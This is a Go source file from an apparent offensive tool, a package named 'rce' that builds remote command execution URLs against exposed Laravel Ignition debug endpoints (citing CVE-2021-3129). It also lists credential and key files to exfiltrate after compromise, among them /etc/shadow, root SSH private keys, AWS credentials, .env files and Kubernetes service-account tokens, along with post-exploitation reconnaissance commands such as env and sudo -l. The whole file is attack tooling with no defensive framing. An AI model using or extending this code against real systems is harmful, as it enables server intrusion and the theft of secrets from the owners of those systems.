// Package rce implements remote command execution primitives used against
// exposed debug endpoints (notably Laravel Ignition) and system-info gathering.
package rce

import (
	"net/url"
	"strings"
)

// HighValuePaths are files worth exfiltrating once code execution is obtained.
var HighValuePaths = []string{
	"/etc/passwd",
	"/etc/shadow",
	"/etc/hostname",
	"/etc/hosts",
	"/etc/sudoers",
	"/root/.ssh/id_rsa",
	"/root/.ssh/id_ed25519",
	"/root/.bash_history",
	"/root/.aws/credentials",
	"/home/*/.ssh/id_rsa",
	"/var/www/.env",
	"/etc/kubernetes/kubelet.conf",
	"/var/run/secrets/kubernetes.io/serviceaccount/token",
}

// SysCommands are reconnaissance commands grouped by theme.
var SysCommands = map[string]string{
	"id":       "id",
	"uname":    "uname -a",
	"whoami":   "whoami",
	"env":      "env",
	"hostname": "hostname",
	"sudo":     "sudo -l 2>/dev/null",
	"docker":   "cat /.dockerenv 2>/dev/null",
	"k8s":      "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null",
}

// LaravelPayload builds the classic Ignition RCE query string for a command.
// It works for the CVE-2021-3129 style sink and simple ?cmd= handlers.
func LaravelPayload(cmd string) string {
	v := url.Values{}
	v.Set("cmd", cmd)
	return v.Encode()
}

// LaravelIgnitionURL builds the full exploitation URL against a base host.
func LaravelIgnitionURL(base, cmd string) string {
	base = strings.TrimRight(base, "/")
	return base + "/_ignition/execute-solution?" + LaravelPayload(cmd)
}

// Wrapper wraps a command so its output is delimited for reliable capture.
func Wrapper(cmd string) string {
	return "echo '---'; " + cmd + "; echo '---'"
}
